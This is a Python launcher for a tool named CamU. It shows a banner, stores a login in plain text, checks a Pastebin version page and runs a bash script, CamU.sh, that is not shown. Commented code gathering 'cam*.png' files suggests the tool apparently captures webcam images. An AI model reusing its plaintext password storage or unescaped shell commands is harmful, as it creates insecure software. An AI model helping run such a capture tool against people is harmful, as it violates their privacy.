import glob, os, shutil ,sys,time
import subprocess
from bs4 import BeautifulSoup
import urllib.request
import webbrowser
path = os.getcwd()
path_lib=os.path.join(path,'lib')
path_cache=os.path.join(path_lib,'cache.txt')
sys.path.append(path_lib)
from colorama import Fore,init
import colorama
colorama.init()
de_version="1.1"
banner=(Fore.LIGHTRED_EX+'''
                                 ▄████▄   ▄▄▄       ███▄ ▄███▓ █    ██ 
                                ▒██▀ ▀█  ▒████▄    ▓██▒▀█▀ ██▒ ██  ▓██▒
                                ▒▓█    ▄ ▒██  ▀█▄  ▓██    ▓██░▓██  ▒██░
                                ▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██    ▒██ ▓▓█  ░██░
                                ▒ ▓███▀ ░ ▓█   ▓██▒▒██▒   ░██▒▒▒█████▓ 
                                ░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░▒▓▒ ▒ ▒ 
                                  ░  ▒     ▒   ▒▒ ░░  ░      ░░░▒░ ░ ░ 
                                ░          ░   ▒   ░      ░    ░░░ ░ ░ 
                                ░ ░            ░  ░       ░      ░     
                                ░                                      '''+Fore.RESET)
author = (Fore.CYAN +'''     Author : Bot-Coder
                                                                             Github  : https://github.com/BOT-CODER
                                                                             Please contact us in github page                                                           
            ''' + Fore.RESET)
def credit():
    print(banner,author)
def chech_con():
    try:
        urllib.request.urlopen('https://www.google.com',timeout=3)
    except KeyboardInterrupt:
        print(Fore.RED + "Stopped by User" + Fore.RESET)
        exit()
    except:
        print(Fore.RED+'Please Check your connection'+Fore.RESET)
        exit()

def cache():
    cache= open(path_cache, 'w')
    inu_user = input(Fore.MAGENTA+'Enter your username(setup):'+Fore.RESET)
    inu_pass = input(Fore.MAGENTA+'Enter your password(setup):'+Fore.RESET)
    print(Fore.GREEN+"User Created "+Fore.RESET)
    time.sleep(2)
    os.system('clear')
    credit()
    cache.write(inu_user)
    cache.write('\n')
    cache.write(inu_pass)
def check_cache():
    tof=os.path.isfile(path_cache)
    if tof is True:
        temp_open = open(path_cache, 'r')
        temp_read=temp_open.readline()
        temp_open.close()
        if temp_read == "":
            cache()
        else:
            pass

    elif tof is False:
        cache()
def login():
    open_file=open(path_cache,'r')
    open_cache=open_file.read().splitlines()
    open_file.close()
    var1 = open_cache[0]
    var2 = open_cache[1]
    log_id = input('\033[1;32mUsername :\033[0m')
    log_pass = input('\033[1;32mPassword :\033[0m')
    if var1 == log_id and var2 == log_pass:
        print(Fore.CYAN+"Suscces"+Fore.RESET)
        time.sleep(2)
        os.system('clear')
        credit()
        pass
    else:
        print(Fore.RED+"Invaild User"+Fore.RESET)
        exit()
def main():
    try:
        path_script = os.path.join(path,'CamU.sh')
        os.chmod(path_script, 0o775)
        subprocess.call(['bash', path_script])
    except KeyboardInterrupt:
        print(Fore.RED+'Exited'+Fore.RESET)
        exit()
        '''
        cam_file = glob.glob('cam*.png')
        cam_len = len(cam_file)
        if cam_len != 0:
            for cap in cam_file:
                path_cam = os.path.join(path_lib,cap)
                os.system('mv ' + path_cam + ' ' + path)
        else:
            exit()
        '''
    except Exception as error:
        print(Fore.RED+" Something Went Wrong\n","Reason : ",error,Fore.RESET)
def updater():
    page = urllib.request.urlopen('https://pastebin.com/P5zz0NnS').read()
    soup = BeautifulSoup(page, 'html.parser')
    version=soup.find('div',class_='de1').text
    if version > de_version:
        print(Fore.CYAN+"Version "+Fore.MAGENTA+version+Fore.CYAN+" is Avaiable")
        print(Fore.RED+"Please update the Program")
        print("Redirecting...."+Fore.RESET)
        time.sleep(3)
        webbrowser.open('https://github.com/BOT-CODER/SniperMan')
        exit()
    else:
        main()
if __name__ == '__main__':
    credit()
    chech_con()
    check_cache()
    login()
    updater()